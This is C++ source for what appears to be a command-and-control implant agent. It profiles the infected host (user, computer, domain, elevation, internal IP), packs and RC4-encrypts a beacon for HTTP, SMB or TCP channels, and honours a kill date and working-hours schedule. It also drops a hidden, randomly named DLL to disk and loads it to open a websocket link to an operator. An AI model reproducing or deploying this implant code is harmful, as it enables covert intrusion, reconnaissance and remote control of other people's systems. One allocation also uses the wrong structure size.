#include "Agent.h"
#include "ApiLoader.h"
#include "utils.h"
#include "Packer.h"
#include "Crypt.h"

Agent::Agent()
{
	info  = (AgentInfo*) MemAllocLocal(sizeof(AgentInfo));
	*info = AgentInfo();
	
	config  = (AgentConfig*) MemAllocLocal(sizeof(AgentConfig));
	*config = AgentConfig();

	commander  = (Commander*) MemAllocLocal(sizeof(AgentConfig));
	*commander = Commander(this);

	downloader  = (Downloader*) MemAllocLocal(sizeof(Downloader));
	*downloader = Downloader( config->download_chunk_size );

	jober  = (JobsController*)MemAllocLocal(sizeof(JobsController));
	*jober = JobsController();

	memorysaver  = (MemorySaver*)MemAllocLocal(sizeof(MemorySaver));
	*memorysaver = MemorySaver();

	proxyfire  = (Proxyfire*)MemAllocLocal(sizeof(Proxyfire));
	*proxyfire = Proxyfire();

	pivotter  = (Pivotter*)MemAllocLocal(sizeof(Pivotter));
	*pivotter = Pivotter();

	SessionKey = (PBYTE) MemAllocLocal(16);
	for (int i = 0; i < 16; i++)
		SessionKey[i] = GenerateRandom32() % 0x100;

	this->config->active = true;
}

void Agent::SetActive(BOOL state)
{
	this->config->active = state;
}

BOOL Agent::IsActive()
{
	ULONG now = GetSystemTimeAsUnixTimestamp();
	return this->config->active && !(this->config->kill_date && now >= this->config->kill_date);
}

ULONG Agent::GetWorkingSleep() 
{
    if ( !this->config->working_time )
        return 0;

    WORD endM   = (this->config->working_time >> 0) % 64;
    WORD endH   = (this->config->working_time >> 8) % 64;
    WORD startM = (this->config->working_time >> 16) % 64;
    WORD startH = (this->config->working_time >> 24) % 64;

	ULONG newSleepTime = 0;
	SYSTEMTIME SystemTime = { 0 };
    ApiWin->GetLocalTime(&SystemTime);

    if (SystemTime.wHour < startH) {
        newSleepTime = (startH - SystemTime.wHour) * 60 + (startM - SystemTime.wMinute);
    }
    else if (endH < SystemTime.wHour) {
        newSleepTime = (24 - SystemTime.wHour - 1) * 60 + (60 - SystemTime.wMinute);
        newSleepTime += startH * 60 + startM;
    }
    else if (SystemTime.wHour == startH && SystemTime.wMinute < startM) {
        newSleepTime = startM - SystemTime.wMinute;
    }
    else if (SystemTime.wHour == endH && endM <= SystemTime.wMinute) {
        newSleepTime = 23 * 60 + (60 + startM - SystemTime.wMinute);
    }
    else {
        return 0;
    }

    return newSleepTime * 60 - SystemTime.wSecond;
}

BYTE* Agent::BuildBeat(ULONG* size)
{
	BYTE flag = 0;
	flag += this->info->is_server; 
	flag <<= 1;
	flag += this->info->elevated;
	flag <<= 1;
	flag += this->info->sys64;
	flag <<= 1;
	flag += this->info->arch64;

	Packer* packer = (Packer*) MemAllocLocal(sizeof(Packer));
	*packer = Packer();

	packer->Pack32(this->config->agent_type);
	packer->Pack32(this->info->agent_id);
	packer->Pack32(this->config->sleep_delay);
	packer->Pack32(this->config->jitter_delay);
	packer->Pack32(this->config->kill_date);
	packer->Pack32(this->config->working_time);
	packer->Pack16(this->info->acp);
	packer->Pack16(this->info->oemcp);
	packer->Pack8(this->info->gmt_offest);
	packer->Pack16(this->info->pid);
	packer->Pack16(this->info->tid);
	packer->Pack32(this->info->build_number);
	packer->Pack8(this->info->major_version);
	packer->Pack8(this->info->minor_version);
	packer->Pack32(this->info->internal_ip);
	packer->Pack8( flag );
	packer->PackBytes(this->SessionKey, 16);
	packer->PackStringA(this->info->domain_name);
	packer->PackStringA(this->info->computer_name);
	packer->PackStringA(this->info->username);
	packer->PackStringA(this->info->process_name);

	EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, 16);

	MemFreeLocal((LPVOID*)&this->info->domain_name,   StrLenA(this->info->domain_name));
	MemFreeLocal((LPVOID*)&this->info->computer_name, StrLenA(this->info->computer_name));
	MemFreeLocal((LPVOID*)&this->info->username,      StrLenA(this->info->username));
	MemFreeLocal((LPVOID*)&this->info->process_name,  StrLenA(this->info->process_name));

#if defined(BEACON_HTTP) 

	ULONG beat_size = packer->datasize();
	PBYTE beat      = packer->data();

#elif defined(BEACON_SMB) 

	ULONG beat_size = packer->datasize() + 4;
	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);

	memcpy(beat, &(this->config->listener_type), 4);
	memcpy(beat+4, packer->data(), packer->datasize());

	PBYTE pdata = packer->data();
	MemFreeLocal((LPVOID*)&pdata, packer->datasize());

#elif defined(BEACON_TCP) 

	ULONG beat_size = packer->datasize() + 4;
	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);

	memcpy(beat, &(this->config->listener_type), 4);
	memcpy(beat + 4, packer->data(), packer->datasize());

	PBYTE pdata = packer->data();
	MemFreeLocal((LPVOID*)&pdata, packer->datasize());

#endif

	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));

	*size = beat_size;
	return beat;
}

#if defined(BEACON_HTTP)

BOOL Agent::StartWebsocketChannel(const MemoryData& moduleData, CHAR* agentId, ULONG agentIdSize, CHAR* url, ULONG urlSize, CHAR* token, ULONG tokenSize, BYTE* sessionKey, ULONG sessionKeySize, BYTE* certData, ULONG certSize, DWORD* errorCode)
{
	if (errorCode)
		*errorCode = ERROR_INVALID_PARAMETER;

	StopWebsocketChannel();

	if (moduleData.complete == FALSE || moduleData.buffer == NULL || moduleData.totalSize == 0) {
		if (errorCode)
			*errorCode = ERROR_INVALID_DATA;
		return FALSE;
	}

	if (sessionKey == NULL || sessionKeySize != 16) {
		if (errorCode)
			*errorCode = ERROR_INVALID_DATA;
		return FALSE;
	}

	CHAR moduleName[32] = { 0 };
	const CHAR hexDigits[] = "0123456789abcdef";
	ULONG r = GenerateRandom32();
	moduleName[0] = 'w';
	moduleName[1] = 's';
	for (int i = 0; i < 8; i++) {
		moduleName[2 + i] = hexDigits[(r >> (i * 4)) & 0xF];
	}
	moduleName[10] = '.';
	moduleName[11] = 'd';
	moduleName[12] = 'l';
	moduleName[13] = 'l';
	moduleName[14] = 0;

	HANDLE hFile = ApiWin->CreateFileA(moduleName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		if (errorCode)
			*errorCode = TEB->LastErrorValue;
		return FALSE;
	}

	DWORD written = 0;
	BOOL ok = ApiWin->WriteFile(hFile, moduleData.buffer, moduleData.totalSize, &written, NULL);
	ApiNt->NtClose(hFile);
	if (!ok || written != moduleData.totalSize) {
		ApiWin->DeleteFileA(moduleName);
		if (errorCode)
			*errorCode = TEB->LastErrorValue;
		return FALSE;
	}

	HMODULE module = ApiWin->LoadLibraryA(moduleName);
	if (!module) {
		ApiWin->DeleteFileA(moduleName);
		if (errorCode)
			*errorCode = TEB->LastErrorValue;
		return FALSE;
	}

	LPFN_WS_CHANNEL_START startProc = (LPFN_WS_CHANNEL_START)ApiWin->GetProcAddress(module, "StartWsChannel");
	LPFN_WS_CHANNEL_STOP stopProc = (LPFN_WS_CHANNEL_STOP)ApiWin->GetProcAddress(module, "StopWsChannel");
	if (!startProc || !stopProc) {
		ApiWin->FreeLibrary(module);
		ApiWin->DeleteFileA(moduleName);
		if (errorCode)
			*errorCode = ERROR_PROC_NOT_FOUND;
		return FALSE;
	}

	DWORD moduleNameLen = StrLenA(moduleName) + 1;
	this->websocketModulePath = (CHAR*)MemAllocLocal(moduleNameLen);
	if (!this->websocketModulePath) {
		ApiWin->FreeLibrary(module);
		ApiWin->DeleteFileA(moduleName);
		if (errorCode)
			*errorCode = ERROR_NOT_ENOUGH_MEMORY;
		return FALSE;
	}
	memcpy(this->websocketModulePath, moduleName, moduleNameLen);

	ULONG agentSize = agentIdSize ? agentIdSize : 1;
	ULONG urlLen = urlSize ? urlSize : 1;
	ULONG tokenLen = tokenSize ? tokenSize : 1;

	this->websocketAgentId = (CHAR*)MemAllocLocal(agentSize);
	this->websocketUrl = (CHAR*)MemAllocLocal(urlLen);
	this->websocketToken = (CHAR*)MemAllocLocal(tokenLen);
	this->websocketSessionKey = (BYTE*)MemAllocLocal(sessionKeySize);

	if (!this->websocketAgentId || !this->websocketUrl || !this->websocketToken || !this->websocketSessionKey) {
		if (errorCode)
			*errorCode = ERROR_NOT_ENOUGH_MEMORY;
		StopWebsocketChannel();
		ApiWin->FreeLibrary(module);
		ApiWin->DeleteFileA(moduleName);
		return FALSE;
	}

	memcpy(this->websocketAgentId, agentId, agentSize);
	this->websocketAgentId[agentSize - 1] = 0;
	memcpy(this->websocketUrl, url, urlLen);
	this->websocketUrl[urlLen - 1] = 0;
	memcpy(this->websocketToken, token, tokenLen);
	this->websocketToken[tokenLen - 1] = 0;
	memcpy(this->websocketSessionKey, sessionKey, sessionKeySize);

	this->websocketCert = NULL;
	this->websocketCertSize = certSize;
	if (certSize > 0 && certData) {
		this->websocketCert = (BYTE*)MemAllocLocal(certSize);
		if (!this->websocketCert) {
			if (errorCode)
				*errorCode = ERROR_NOT_ENOUGH_MEMORY;
			StopWebsocketChannel();
			ApiWin->FreeLibrary(module);
			ApiWin->DeleteFileA(moduleName);
			return FALSE;
		}
		memcpy(this->websocketCert, certData, certSize);
	}

	WS_CHANNEL_CONTEXT ctx = { 0 };
	ctx.agent_id = this->websocketAgentId;
	ctx.token = this->websocketToken;
	ctx.url = this->websocketUrl;
	ctx.session_key = this->websocketSessionKey;
	ctx.cert_data = this->websocketCert;
	ctx.cert_size = this->websocketCert ? certSize : 0;

	if (!startProc(&ctx)) {
		if (errorCode)
			*errorCode = ERROR_FUNCTION_FAILED;
		StopWebsocketChannel();
		ApiWin->FreeLibrary(module);
		ApiWin->DeleteFileA(moduleName);
		return FALSE;
	}

	this->websocketModule = module;
	this->websocketStartFunc = startProc;
	this->websocketStopFunc = stopProc;

	return TRUE;
}

void Agent::StopWebsocketChannel()
{
	if (this->websocketStopFunc)
		this->websocketStopFunc();

	if (this->websocketModule) {
		ApiWin->FreeLibrary(this->websocketModule);
		this->websocketModule = NULL;
	}

	if (this->websocketModulePath) {
		ApiWin->DeleteFileA(this->websocketModulePath);
		DWORD len = StrLenA(this->websocketModulePath) + 1;
		MemFreeLocal((LPVOID*)&this->websocketModulePath, len);
		this->websocketModulePath = NULL;
	}

	if (this->websocketAgentId) {
		DWORD len = StrLenA(this->websocketAgentId) + 1;
		MemFreeLocal((LPVOID*)&this->websocketAgentId, len);
		this->websocketAgentId = NULL;
	}

	if (this->websocketUrl) {
		DWORD len = StrLenA(this->websocketUrl) + 1;
		MemFreeLocal((LPVOID*)&this->websocketUrl, len);
		this->websocketUrl = NULL;
	}

	if (this->websocketToken) {
		DWORD len = StrLenA(this->websocketToken) + 1;
		MemFreeLocal((LPVOID*)&this->websocketToken, len);
		this->websocketToken = NULL;
	}

	if (this->websocketSessionKey) {
		MemFreeLocal((LPVOID*)&this->websocketSessionKey, 16);
		this->websocketSessionKey = NULL;
	}

	if (this->websocketCert) {
		MemFreeLocal((LPVOID*)&this->websocketCert, this->websocketCertSize);
		this->websocketCert = NULL;
	}

	this->websocketCertSize = 0;
	this->websocketStartFunc = NULL;
	this->websocketStopFunc = NULL;
}

#endif
